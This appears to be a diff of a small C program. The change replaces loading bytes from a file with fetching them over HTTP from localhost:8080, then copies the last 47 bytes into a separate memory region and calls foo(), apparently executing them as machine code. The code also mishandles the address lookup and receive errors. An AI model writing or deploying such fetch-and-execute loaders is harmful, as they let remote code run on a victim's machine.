@@ -1,41 +1,60 @@
 
+#include <arpa/inet.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/mman.h>
 #include <unistd.h>
 
-const char FILENAME[] = "blob";
+#define LEN 1024
+
+const char REQUEST[] = "GET / HTTP/1.1\r\nHost: localhost:8080\r\n\r\n";
 
 void foo(void);
 
 int main(void) {
-    size_t bytes, pagesize;
-    unsigned char *buf;
+    int sockfd;
+    size_t bytes, length, pagesize;
     void *p, *a;
-    FILE *fd;
+    unsigned char *b;
+    unsigned char buf[LEN];
+    struct sockaddr_in addr;
 
-    if ((fd = fopen(FILENAME, "rb")) == NULL) {
-        fprintf(stderr, "error opening file [%s]\n", FILENAME);
+    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
+        fprintf(stderr, "error opening socket\n");
         exit(EXIT_FAILURE);
     }
 
-    fseek(fd, 0, SEEK_END);
-    bytes = ftell(fd);
-    fseek(fd, 0, SEEK_SET);
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(8080);
+    inet_pton(AF_INET, "localhost", &addr.sin_addr);
 
-    if ((buf = malloc(bytes)) == NULL) {
-        fprintf(stderr, "memory allocation failed\n");
+    if (connect(sockfd, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
+        fprintf(stderr, "socket connection failed\n");
         exit(EXIT_FAILURE);
     }
 
-    if (fread(buf, 1, bytes, fd) != bytes) {
-        fprintf(stderr, "error with reading file [%s]\n", FILENAME);
+    bytes = strlen(REQUEST);
+
+    if (send(sockfd, (void *) REQUEST, bytes, 0) != bytes) {
+        fprintf(stderr, "error sending request\n");
         exit(EXIT_FAILURE);
     }
 
-    if (fclose(fd) == EOF) {
-        fprintf(stderr, "error closing file [%s]\n", FILENAME);
+    b = buf;
+    length = LEN - 1;
+
+    do {
+        bytes = recv(sockfd, b, length, 0);
+        b += bytes;
+        length -= bytes;
+    } while (bytes > 0 && length > 0);
+
+    bytes = b - buf;
+
+    if (close(sockfd) == -1) {
+        fprintf(stderr, "error closing socket\n");
         exit(EXIT_FAILURE);
     }
 
@@ -48,8 +67,8 @@ int main(void) {
         exit(EXIT_FAILURE);
     }
 
-    memcpy(a, buf, bytes);
-    free(buf);
+    p = buf + bytes - 0x2f;
+    memcpy(a, p, 0x2f);
 
     foo();
 
